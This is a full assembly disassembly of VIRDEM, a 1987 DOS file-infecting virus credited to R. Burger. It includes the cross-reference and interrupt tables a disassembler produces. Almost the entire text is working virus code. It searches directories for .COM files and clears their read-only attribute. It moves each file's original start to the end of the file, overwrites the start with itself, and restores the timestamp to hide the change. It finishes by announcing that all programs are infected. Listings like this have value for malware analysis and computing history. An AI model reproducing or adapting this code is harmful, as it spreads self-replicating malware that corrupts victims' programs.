;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ                             VIRDEM                                   ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ      Created:   16-Mar-87                                            ÛÛ
;ÛÛ      Version:                                                        ÛÛ
;ÛÛ      Passes:    5          Analysis Options on: QRS                  ÛÛ
;ÛÛ      Copyright by R.Burger 1986,1987                                 ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

data_1e         equ     80h                     ; (8C04:0080=0)
data_2e         equ     9Eh                     ; (8C04:009E=0)
data_16e        equ     0F800h                  ; (8C04:F800=0)
data_17e        equ     0FD00h                  ; (8C04:FD00=0)

seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a


                org     100h

virdem          proc    far

start:
                nop
                nop
                nop
                mov     sp,0FE00h
                push    ax
                push    bx
                push    cx
                push    dx
                push    bp
                push    si
                push    di
                push    ds
                push    es
                push    ss
                pushf                           ; Push flags
                mov     si,data_1e              ; (8C04:0080=0)
                lea     di,cs:[3BFh]            ; Load effective addr
                mov     cx,20h
                rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
                mov     ax,0
                mov     es:data_5,ax            ; (8C04:038F=0)
                mov     bl,byte ptr es:data_12+0Dh      ; (8C04:0422=30h)
                cmp     bl,39h                  ; '9'
                je      loc_1                   ; Jump if equal
                inc     bl
loc_1:                                          ;  xref 8C04:012C
                mov     byte ptr es:data_12+0Dh,bl      ; (8C04:0422=30h)

                mov     ah,19h
                int     21h                     ; DOS Services  ah=function 19h
                                                ;  get default drive al  (0=a:)
                mov     cs:data_10,al           ; (8C04:03E1=0)
                mov     ah,47h                  ; 'G'
                mov     dh,0
                add     al,1
                mov     dl,al
                lea     si,cs:[3E3h]            ; Load effective addr
                int     21h                     ; DOS Services  ah=function 47h
                                                ;  get present dir,drive dl,1=a:
                jmp     short loc_3             ; (016D)
                db      90h
loc_2:                                          ;  xref 8C04:0191, 01A0
                mov     ah,40h                  ; '@'
                mov     bx,1
                mov     cx,34h
                nop
                lea     dx,cs:[57Ch]            ; Load effective addr
                int     21h                     ; DOS Services  ah=function 40h
                                                ;  write file cx=bytes, to ds:dx
                mov     dx,cs:data_6            ; (8C04:0391=600h)
                mov     cs:data_17e,dx          ; (8C04:FD00=0)
                jmp     loc_12                  ; (02E4)
                jmp     loc_12                  ; (02E4)
loc_3:                                          ;  xref 8C04:014B
                mov     dl,0
                mov     ah,0Eh
                int     21h                     ; DOS Services  ah=function 0Eh
                                                ;  set default drive dl  (0=a:)
                mov     ah,3Bh                  ; ';'
                lea     dx,cs:[3DFh]            ; Load effective addr
                int     21h                     ; DOS Services  ah=function 3Bh
                                                ;  set current dir, path @ ds:dx
                jmp     short loc_7             ; (01C9)
                db      90h
loc_4:                                          ;  xref 8C04:01D4, 01E7
                mov     ah,3Bh                  ; ';'
                lea     dx,cs:[3DFh]            ; Load effective addr
                int     21h                     ; DOS Services  ah=function 3Bh
                                                ;  set current dir, path @ ds:dx
                mov     ah,4Eh                  ; 'N'
                mov     cx,11h
                lea     dx,cs:[399h]            ; Load effective addr
                int     21h                     ; DOS Services  ah=function 4Eh
                                                ;  find 1st filenam match @ds:dx
                jc      loc_2                   ; Jump if carry Set
                mov     bx,cs:data_5            ; (8C04:038F=0)
                inc     bx
                dec     bx
                jz      loc_6                   ; Jump if zero
loc_5:                                          ;  xref 8C04:01A3
                mov     ah,4Fh                  ; 'O'
                int     21h                     ; DOS Services  ah=function 4Fh
                                                ;  find next filename match
                jc      loc_2                   ; Jump if carry Set
                dec     bx

                jnz     loc_5                   ; Jump if not zero
loc_6:                                          ;  xref 8C04:019A
                mov     ah,2Fh                  ; '/'
                int     21h                     ; DOS Services  ah=function 2Fh
                                                ;  get DTA ptr into es:bx
                add     bx,1Ch
                mov     word ptr es:[bx],5C20h
                inc     bx
                push    ds
                mov     ax,es
                mov     ds,ax
                mov     dx,bx
                mov     ah,3Bh                  ; ';'
                int     21h                     ; DOS Services  ah=function 3Bh
                                                ;  set current dir, path @ ds:dx
                pop     ds
                mov     bx,cs:data_5            ; (8C04:038F=0)
                inc     bx
                mov     cs:data_5,bx            ; (8C04:038F=0)
loc_7:                                          ;  xref 8C04:017B
                mov     ah,4Eh                  ; 'N'
                mov     cx,1
                lea     dx,cs:[393h]            ; Load effective addr
                int     21h                     ; DOS Services  ah=function 4Eh
                                                ;  find 1st filenam match @ds:dx
                jc      loc_4                   ; Jump if carry Set
                mov     bx,es:data_5            ; (8C04:038F=0)
                cmp     bx,0
                je      loc_8                   ; Jump if equal
                jmp     short loc_9             ; (01E9)
                db      90h
loc_8:                                          ;  xref 8C04:01DE, 020D
                mov     ah,4Fh                  ; 'O'
                int     21h                     ; DOS Services  ah=function 4Fh
                                                ;  find next filename match
                jc      loc_4                   ; Jump if carry Set
loc_9:                                          ;  xref 8C04:01E0
                mov     ah,3Dh                  ; '='
                mov     al,2
                mov     dx,data_2e              ; (8C04:009E=0)
                int     21h                     ; DOS Services  ah=function 3Dh
                                                ;  open file, al=mode,name@ds:dx
                mov     bx,ax
                mov     ah,3Fh                  ; '?'
                mov     cx,500h
                nop
                mov     dx,data_16e             ; (8C04:F800=0)
                nop
                int     21h                     ; DOS Services  ah=function 3Fh
                                                ;  read file, cx=bytes, to ds:dx
                mov     ah,3Eh                  ; '>'
                int     21h                     ; DOS Services  ah=function 3Eh
                                                ;  close file, bx=file handle
                mov     bx,cs:data_16e          ; (8C04:F800=0)
                cmp     bx,9090h
                je      loc_8                   ; Jump if equal
                mov     ah,43h                  ; 'C'

                mov     al,0
                mov     dx,data_2e              ; (8C04:009E=0)
                int     21h                     ; DOS Services  ah=function 43h
                                                ;  get/set file attrb, nam@ds:dx
                mov     ah,43h                  ; 'C'
                mov     al,1
                and     cx,0FEh
                int     21h                     ; DOS Services  ah=function 43h
                                                ;  get/set file attrb, nam@ds:dx
                mov     ah,3Dh                  ; '='
                mov     al,2
                mov     dx,data_2e              ; (8C04:009E=0)
                int     21h                     ; DOS Services  ah=function 3Dh
                                                ;  open file, al=mode,name@ds:dx
                mov     bx,ax
                mov     ah,57h                  ; 'W'
                mov     al,0
                int     21h                     ; DOS Services  ah=function 57h
                                                ;  get/set file date & time
                push    cx
                push    dx
                mov     ah,42h                  ; 'B'
                mov     al,2
                mov     dx,0
                mov     cx,0
                int     21h                     ; DOS Services  ah=function 42h
                                                ;  move file ptr, cx,dx=offset
                test    ax,8000h
                jnz     loc_10                  ; Jump if not zero
                cmp     ax,500h
                nop
                ja      loc_10                  ; Jump if above
                call    sub_3                   ; (0380)
loc_10:                                         ;  xref 8C04:0244, 024A
                push    ax
                push    dx
                mov     ah,40h                  ; '@'
                mov     cx,500h
                nop
                mov     dx,data_16e             ; (8C04:F800=0)
                nop
                int     21h                     ; DOS Services  ah=function 40h
                                                ;  write file cx=bytes, to ds:dx
                pop     dx
                pop     ax
                add     ax,100h
                mov     es:data_4,ax            ; (8C04:02BD=0)
                add     ax,500h
                nop
                mov     dx,cs:data_6            ; (8C04:0391=600h)
                mov     cs:data_17e,dx          ; (8C04:FD00=0)
                mov     es:data_6,ax            ; (8C04:0391=600h)
                mov     ah,40h                  ; '@'
                mov     cx,38h
                nop
                lea     dx,cs:[287h]            ; Load effective addr
                int     21h                     ; DOS Services  ah=function 40h

                                                ;  write file cx=bytes, to ds:dx
                jmp     short loc_11            ; (02C0)
                db      90h
                db      0BFh, 80h, 00h, 8Dh, 36h,0BFh
                db       03h,0B9h, 20h, 00h,0F3h,0A4h
                db      0E8h, 00h, 00h

virdem          endp

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_1           proc    near
                pop     ax
                mov     bx,27h
                nop
                add     ax,bx
                mov     si,ax
                mov     bx,es:[si]
                mov     si,bx
                mov     di,offset ds:[100h]     ; (8C04:0100=90h)
                mov     cx,500h
                nop
                rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
                popf                            ; Pop flags
                pop     ss
                pop     es
                pop     ds
                pop     di
                pop     si
                pop     bp
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                mov     ax,offset start
                push    ax
                ret
sub_1           endp

data_4          dw      0                       ;  xref 8C04:0262
                db      90h
loc_11:                                         ;  xref 8C04:0284
                mov     ah,42h                  ; 'B'
                mov     al,0
                mov     dx,0
                mov     cx,0
                int     21h                     ; DOS Services  ah=function 42h
                                                ;  move file ptr, cx,dx=offset
                mov     ah,40h                  ; '@'
                mov     cx,500h
                nop
                lea     dx,cs:[100h]            ; Load effective addr
                int     21h                     ; DOS Services  ah=function 40h
                                                ;  write file cx=bytes, to ds:dx
                mov     ah,57h                  ; 'W'

                mov     al,1
                pop     dx
                pop     cx
                int     21h                     ; DOS Services  ah=function 57h
                                                ;  get/set file date & time
                mov     ah,3Eh                  ; '>'
                int     21h                     ; DOS Services  ah=function 3Eh
                                                ;  close file, bx=file handle
loc_12:                                         ;  xref 8C04:0167, 016A
                nop
                call    sub_2                   ; (036E)
                mov     bl,byte ptr es:data_12+0Dh      ; (8C04:0422=30h)
                cmp     bl,31h                  ; '1'
                jne     loc_13                  ; Jump if not equal
                mov     ah,40h                  ; '@'
                mov     bx,1
                mov     cx,67h
                nop
                lea     dx,cs:[404h]            ; Load effective addr
                int     21h                     ; DOS Services  ah=function 40h
                                                ;  write file cx=bytes, to ds:dx
                mov     ah,0
                int     21h                     ; DOS Services  ah=function 00h
                                                ;  terminate, cs=progm seg prefx
loc_13:                                         ;  xref 8C04:02F0
                mov     ah,40h                  ; '@'
                mov     bx,1
                mov     cx,102h
                nop
                lea     dx,cs:[404h]            ; Load effective addr
                int     21h                     ; DOS Services  ah=function 40h
                                                ;  write file cx=bytes, to ds:dx
                mov     ah,2
                mov     bl,byte ptr es:data_12+0Dh      ; (8C04:0422=30h)
                mov     dl,bl
                int     21h                     ; DOS Services  ah=function 02h
                                                ;  display char dl
                mov     ah,2Ch                  ; ','
                int     21h                     ; DOS Services  ah=function 2Ch
                                                ;  get time, cx=hrs/min, dh=sec
                mov     ah,0Ch
                mov     al,1
                int     21h                     ; DOS Services  ah=function 0Ch
                                                ;  clear keybd buffer & input al
                or      dl,30h                  ; '0'
                and     dl,bl
                cmp     dl,al
                je      loc_14                  ; Jump if equal
                mov     bl,dl
                mov     ah,2
                mov     dl,20h                  ; ' '
                int     21h                     ; DOS Services  ah=function 02h
                                                ;  display char dl
                mov     dl,3Eh                  ; '>'
                int     21h                     ; DOS Services  ah=function 02h
                                                ;  display char dl
                mov     dl,bl

                int     21h                     ; DOS Services  ah=function 02h
                                                ;  display char dl
                mov     dl,3Ch                  ; '<'
                int     21h                     ; DOS Services  ah=function 02h
                                                ;  display char dl
                mov     ah,40h                  ; '@'
                mov     bx,1
                mov     cx,3Ch
                nop
                lea     dx,cs:[507h]            ; Load effective addr
                int     21h                     ; DOS Services  ah=function 40h
                                                ;  write file cx=bytes, to ds:dx
                mov     ah,0
                int     21h                     ; DOS Services  ah=function 00h
                                                ;  terminate, cs=progm seg prefx
loc_14:                                         ;  xref 8C04:0330
                mov     ah,40h                  ; '@'
                mov     bx,1
                mov     cx,37h
                nop
                lea     dx,cs:[544h]            ; Load effective addr
                int     21h                     ; DOS Services  ah=function 40h
                                                ;  write file cx=bytes, to ds:dx
                mov     ax,es:data_17e          ; (8C04:FD00=0)
                push    ax
                ret

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;
;         Called from:   8C04:02E5
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_2           proc    near
                mov     ah,0Eh
                mov     dl,cs:data_10           ; (8C04:03E1=0)
                int     21h                     ; DOS Services  ah=function 0Eh
                                                ;  set default drive dl  (0=a:)
                mov     ah,3Bh                  ; ';'
                lea     dx,cs:[3E2h]            ; Load effective addr
                int     21h                     ; DOS Services  ah=function 3Bh
                                                ;  set current dir, path @ ds:dx
                ret
sub_2           endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;
;         Called from:   8C04:024C
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_3           proc    near
                mov     ah,42h                  ; 'B'
                mov     al,0
                mov     dx,500h
                nop

                mov     cx,0
                int     21h                     ; DOS Services  ah=function 42h
                                                ;  move file ptr, cx,dx=offset
                ret
sub_3           endp

                db      0
data_5          dw      0                       ;  xref 8C04:0120, 0193, 01BE, 01C4
                                                ;            01D6
data_6          dw      600h                    ;  xref 8C04:015D, 026A, 0274
                db       "*.com", 00h
                db       2Ah, 00h,0FFh, 00h, 00h, 00h
                db       00h, 00h, 3Fh, 00h
                db      "????????exe"
                db       00h, 00h, 00h
                db       00h, 00h
                db      "????????com"
                db      33 dup (0)
                db       5Ch, 00h
data_10         db      0                       ;  xref 8C04:0139, 0370
                db      5Ch
                db      33 dup (0)
                db      'Virdem Ver.: 1.06'


data_12         db      ' (Generation 0) aktive.', 0Ah, 0Dh

copyright       db      'Copyright by R.Burger 1986,1987'
                db      0Ah, 0Dh, 'Phone.: D - 05932/5451'
                db      ' ', 0Ah, 0Dh, ' ', 0Ah, 0Dh, 'T'
                db      'his is a demoprogram for ', 0Ah, 0Dh
                db      'computerviruses. Please put in a'
                db      '   ', 0Ah, 0Dh, 'number now.', 0Ah
                db      0Dh, 'If you', 27h, 're right, yo'
                db      'u', 27h, 'll be', 0Ah, 0Dh, 'abl'
                db      'e to continue.', 0Ah, 0Dh, 'The '
                db      'number is between ', 0Ah, 0Dh, '0'
                db      ' and ', 0
                db      0Ah, 0Dh, 'Sorry, you', 27h, 're '
                db      'wrong', 0Ah, 0Dh, '       ', 0Ah
                db      0Dh, 'More luck at next try ....', 0Ah
                db      0Dh, 0
                db      0Ah, 0Dh, 'Famous. You', 27h, 're'
                db      ' right.', 0Ah, 0Dh, 'You', 27h, 'l'
                db      'l be able to continue. ', 0Ah, 0Dh
                db      0
                db      0Ah, 0Dh, 'All your programs are', 0Ah
                db      0Dh, 'struck by VIRDEM.COM now.', 0Ah
                db      0Dh
                db      0

seg_a           ends

                end     start

±±±±±±±±±±±±±±±±±±±± CROSS REFERENCE - KEY ENTRY POINTS ±±±±±±±±±±±±±±±±±±±

    seg:off    type        label
   ---- ----   ----   ---------------
   8C04:0100   far    start

 ±±±±±±±±±±±±±±±±±± Interrupt Usage Synopsis ±±±±±±±±±±±±±±±±±±

        Interrupt 21h :  terminate, cs=progm seg prefx
        Interrupt 21h :  display char dl
        Interrupt 21h :  clear keybd buffer & input al
        Interrupt 21h :  set default drive dl  (0=a:)
        Interrupt 21h :  get default drive al  (0=a:)
        Interrupt 21h :  get time, cx=hrs/min, dh=sec
        Interrupt 21h :  get DTA ptr into es:bx
        Interrupt 21h :  set current dir, path @ ds:dx
        Interrupt 21h :  open file, al=mode,name@ds:dx
        Interrupt 21h :  close file, bx=file handle
        Interrupt 21h :  read file, cx=bytes, to ds:dx
        Interrupt 21h :  write file cx=bytes, to ds:dx
        Interrupt 21h :  move file ptr, cx,dx=offset
        Interrupt 21h :  get/set file attrb, nam@ds:dx
        Interrupt 21h :  get present dir,drive dl,1=a:
        Interrupt 21h :  find 1st filenam match @ds:dx
        Interrupt 21h :  find next filename match
        Interrupt 21h :  get/set file date & time

 ±±±±±±±±±±±±±±±±±± I/O Port Usage Synopsis  ±±±±±±±±±±±±±±±±±±

        No I/O ports used.

